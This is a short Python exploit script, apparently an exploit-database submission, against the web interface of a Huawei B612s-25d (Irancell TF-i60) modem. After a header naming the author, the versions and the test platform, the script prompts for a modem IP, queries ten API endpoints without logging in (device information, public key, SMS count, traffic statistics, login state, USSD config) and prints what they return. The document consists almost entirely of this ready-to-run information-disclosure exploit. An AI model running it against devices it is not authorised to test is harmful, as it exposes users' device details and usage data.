#!/usr/bin/env python3

### Exploit Title: "Huawei B612s-25d Modem" known as "Irancell - Huawei TF-i60 H1 Modem Information Leaks"
### Date: 2020-07-02
### Exploit Author: Omid Shojaei
### Vendor Homepage: https://consumer.huawei.com/en/
### Current Version (B612s-25d): 81.201.01.01.234
### Software Version : 11.196.01.01.234
### Web UI Version: 21.100.44.00.03
### Tested on: Kali 2020 / TF-i60 Modem
### There are a number of Api(s) on the web interface of this Modem that can lead to information leaks
### Information that has been disclosed are not critical (Like Count of SMS in Inbox and unread Messages)
### Twitter : Dmitriy_Area51 (Omid Shojaei)
### Email   : Dmitriy_area51@yahoo.com
### This vulnerability was first seen in this Modem

import xmltodict
import urllib.request as req

def printf(resp):
    for x in resp:
        print (x)
        for y in resp[x]:
            print (y,':',resp[x][y])

path=["/api/device/basic_information",
"/api/webserver/publickey",
"/api/user/web-feature-switch",
"/api/sms/sms-count",
"/api/monitoring/converged-status",
"/api/monitoring/start_date",
"/api/monitoring/month_statistics",
"/api/monitoring/traffic-statistics",
"/api/user/state-login",
"/config/ussd/prepaidussd.xml"]

address=input("Please Enter Modem IP : ")

for url in path:
    URL="http://"+str(address)+str(url)
    response=req.urlopen(URL)
    parsed_response=xmltodict.parse(response)
    printf(parsed_response)